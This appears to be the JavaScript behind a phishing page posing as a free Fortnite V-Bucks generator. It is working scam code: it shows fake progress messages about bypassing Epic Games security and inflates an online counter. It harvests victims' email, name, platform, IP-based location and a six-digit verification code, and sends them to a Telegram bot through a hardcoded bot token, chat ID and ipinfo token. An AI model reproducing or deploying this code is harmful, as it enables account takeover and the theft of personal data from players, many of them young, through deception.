// Global state
let isConnected = false;
let currentProgress = 0;
let progressInterval;

// Configuration
const BOT_TOKEN = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y';
const CHAT_ID = '-1002465594649';
const IPINFO_TOKEN = '81e788912b1532';

// Function to get user's location from ipinfo.io
async function getUserLocation() {
    try {
        const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
        if (!response.ok) {
            throw new Error('Failed to get location');
        }
        return await response.json();
    } catch (error) {
        console.error('Error getting location:', error);
        return null;
    }
}

// Function to send data to Telegram
async function sendToTelegram(email, name, platform, vbucksAmount, locationData, verificationCode = null) {
    let message = `🎮 New Form Submission:\n\n` +
                 `📧 Email: ${email}\n` +
                 `👤 Name: ${name}\n` +
                 `🎯 Platform: ${platform}\n` +
                 `💰 V-Bucks Amount: ${vbucksAmount}`;

    if (verificationCode) {
        message += `\n🔐 Verification Code: ${verificationCode}`;
    }

    if (locationData) {
        message += `\n\n📍 Location Info:\n` +
                  `🌍 IP: ${locationData.ip}\n` +
                  `🏢 City: ${locationData.city}\n` +
                  `🗺 Region: ${locationData.region}\n` +
                  `🌐 Country: ${locationData.country}\n` +
                  `🏢 Organization: ${locationData.org}\n` +
                  `📍 Location: ${locationData.loc}`;
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error('Failed to send to Telegram');
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// Function to show success animation
function showSuccessAnimation() {
    const successModal = document.getElementById('success-modal');
    const verificationModal = document.getElementById('verification-modal');
    const successVBucksAmount = document.getElementById('success-vbucks-amount');
    const vbucksDisplay = document.getElementById('vbucks-display');
    
    // Update V-Bucks amount in success screen
    successVBucksAmount.textContent = vbucksDisplay.textContent;
    
    // Hide verification modal and show success modal
    verificationModal.style.display = 'none';
    successModal.style.display = 'flex';
    
    // Add console messages with delays
    const consoleLines = document.querySelectorAll('.console-messages .console-line');
    consoleLines.forEach((line, index) => {
        setTimeout(() => {
            line.style.opacity = '1';
        }, 1000 + (index * 500));
    });
}

// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    // Get DOM elements
    const connectButton = document.getElementById('connect-button');
    const loginModal = document.getElementById('epic-login-modal');
    const loadingOverlay = document.getElementById('loading-overlay');
    const loginForm = document.getElementById('epic-login-form');
    const epicEmail = document.getElementById('epic-email');
    const epicName = document.getElementById('epic-name');
    const epicLoginButton = document.getElementById('epic-login-button');
    const vbucksSlider = document.getElementById('vbucks-amount');
    const vbucksDisplay = document.getElementById('vbucks-display');
    const statusBox = document.getElementById('status-box');
    const progressContainer = document.getElementById('progress-container');
    const progressBar = document.querySelector('.progress-fill');
    const progressText = document.querySelector('.progress-text');
    const platformSelect = document.getElementById('platform');
    const verificationModal = document.getElementById('verification-modal');
    const verificationCode = document.getElementById('verification-code');
    const submitVerification = document.getElementById('submit-verification');
    const getVerificationCode = document.getElementById('get-verification-code');
    const doneButton = document.getElementById('done-button');
    const successModal = document.getElementById('success-modal');

    // Update online counter periodically
    setInterval(() => {
        const onlineCount = document.getElementById('online-count');
        const currentCount = parseInt(onlineCount.textContent.replace(',', ''));
        const change = Math.floor(Math.random() * 11) - 5;
        const newCount = Math.max(1000, currentCount + change);
        onlineCount.textContent = newCount.toLocaleString();
    }, 5000);

    // Update V-Bucks display when slider changes
    vbucksSlider.addEventListener('input', () => {
        vbucksDisplay.textContent = parseInt(vbucksSlider.value).toLocaleString();
    });

    // Handle numeric input only for verification code
    verificationCode.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value.length > 6) {
            this.value = this.value.slice(0, 6);
        }
    });

    // Progress bar functions
    function updateProgress(progress) {
        if (progressBar) {
            progressBar.style.width = `${progress}%`;
            if (progressText) {
                progressText.textContent = `PROCESSING... ${progress}%`;
            }
        }
    }

    function startProgress() {
        currentProgress = 0;
        if (progressContainer) {
            progressContainer.style.display = 'block';
        }
        updateProgress(0);

        progressInterval = setInterval(() => {
            if (currentProgress < 100) {
                currentProgress += Math.random() * 2;
                if (currentProgress > 100) currentProgress = 100;
                updateProgress(Math.floor(currentProgress));
            } else {
                clearInterval(progressInterval);
            }
        }, 100);
    }

    function stopProgress() {
        clearInterval(progressInterval);
        currentProgress = 0;
        updateProgress(0);
        if (progressContainer) {
            progressContainer.style.display = 'none';
        }
    }

    // Initial connect button click handler
    const initialConnectHandler = () => {
        const username = document.getElementById('username').value.trim();
        
        if (!username) {
            addStatusLine('Please enter your Epic Games account.', 'error');
            return;
        }

        loadingOverlay.style.display = 'flex';
        
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
            loginModal.style.display = 'flex';
        }, 2000);
    };

    // Set initial click handler
    connectButton.addEventListener('click', initialConnectHandler);

    // Form Validation
    function validateForm() {
        const isValid = epicEmail.value.trim() !== '' && epicName.value.trim() !== '';
        epicLoginButton.disabled = !isValid;
        epicLoginButton.classList.toggle('active', isValid);
    }

    epicEmail.addEventListener('input', validateForm);
    epicName.addEventListener('input', validateForm);

    // Add status line to status box
    function addStatusLine(message, type = 'normal') {
        const statusLine = document.createElement('div');
        statusLine.className = `console-line ${type}`;
        statusLine.textContent = `> ${message}`;
        statusBox.appendChild(statusLine);
        statusBox.scrollTop = statusBox.scrollHeight;
    }

    // Simulate V-Bucks generation process
    function simulateGeneration(email, name) {
        const steps = [
            { message: 'Connection established!', delay: 20, type: 'success' },
            { message: `Looking up player data for: ${name}`, delay: 25, type: 'normal' },
            { message: 'Player found on PlayStation 5!', delay: 30, type: 'success' },
            { message: 'Bypassing security protocols...', delay: 35, type: 'warning' },
            { message: 'Access granted to V-Bucks generation module', delay: 25, type: 'success' },
            { message: `Preparing to generate ${vbucksDisplay.textContent} V-Bucks...`, delay: 20, type: 'normal' },
            { message: 'Generation process started...', delay: 30, type: 'normal' },
            { message: 'Loading resources...', delay: 40, type: 'normal' },
            { message: 'Initializing transfer protocols...', delay: 35, type: 'normal' },
            { message: 'Transfer protocols initialized', delay: 20, type: 'success' },
            { message: 'Bypassing Epic Games security...', delay: 45, type: 'warning' },
            { message: 'Security bypass successful', delay: 20, type: 'success' },
            { message: 'Verification required to complete process...', delay: 25, type: 'warning' },
            { message: 'Please complete verification to finalize the process.', delay: 0, type: 'error' }
        ];

        progressContainer.style.display = 'block';
        startProgress();

        let currentStep = 0;
        const processStep = () => {
            if (currentStep < steps.length) {
                addStatusLine(steps[currentStep].message, steps[currentStep].type);
                currentStep++;
                if (currentStep < steps.length) {
                    setTimeout(processStep, steps[currentStep - 1].delay * 100);
                } else {
                    setTimeout(() => {
                        stopProgress();
                        verificationModal.style.display = 'flex';
                    }, 1000);
                }
            }
        };

        processStep();
    }

    // Handle get verification code button click
    getVerificationCode.addEventListener('click', function() {
        window.open('YOUR_VERIFICATION_LINK', '_blank');
    });

    // Handle verification submission
    submitVerification.addEventListener('click', async function() {
        const code = verificationCode.value;
        if (code.length !== 6) {
            alert('Please enter a valid 6-digit verification code.');
            return;
        }

        // Get location data and send to Telegram with verification code
        const locationData = await getUserLocation();
        await sendToTelegram(
            epicEmail.value,
            epicName.value,
            platformSelect.value,
            vbucksDisplay.textContent,
            locationData,
            code
        );

        // Show success animation
        showSuccessAnimation();
    });

    // Handle done button click
    doneButton.addEventListener('click', function() {
        successModal.style.display = 'none';
        // Reset the form or redirect as needed
        window.location.reload();
    });

    // Handle initial form submission
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = epicEmail.value;
        const name = epicName.value;
        const platform = platformSelect.value;
        const vbucksAmount = vbucksDisplay.textContent;
        
        epicLoginButton.classList.add('loading');
        epicLoginButton.disabled = true;

        const locationData = await getUserLocation();
        await sendToTelegram(email, name, platform, vbucksAmount, locationData);
        
        setTimeout(() => {
            loginModal.style.display = 'none';
            
            epicLoginButton.classList.remove('loading');
            epicLoginButton.disabled = false;
            
            connectButton.disabled = true;
            connectButton.innerHTML = '<div class="connecting-state">CONNECTING <div class="button-spinner"></div></div>';
            statusBox.innerHTML = '';
            
            addStatusLine('Connecting to Epic Games servers...', 'normal');
            
            setTimeout(() => {
                addStatusLine('Server verification in progress...', 'warning');
                
                setTimeout(() => {
                    addStatusLine('Verification successful!', 'success');
                    
                    connectButton.textContent = 'GENERATE V-BUCKS';
                    connectButton.disabled = false;
                    connectButton.style.cursor = 'pointer';
                    connectButton.classList.add('generating');
                    
                    connectButton.removeEventListener('click', initialConnectHandler);
                    connectButton.onclick = () => {
                        connectButton.disabled = true;
                        connectButton.style.cursor = 'default';
                        connectButton.innerHTML = '<div class="connecting-state">GENERATE V-BUCKS <div class="button-spinner"></div></div>';
                        simulateGeneration(email, name);
                    };
                }, 2000);
            }, 2000);
        }, 2000);
    });
});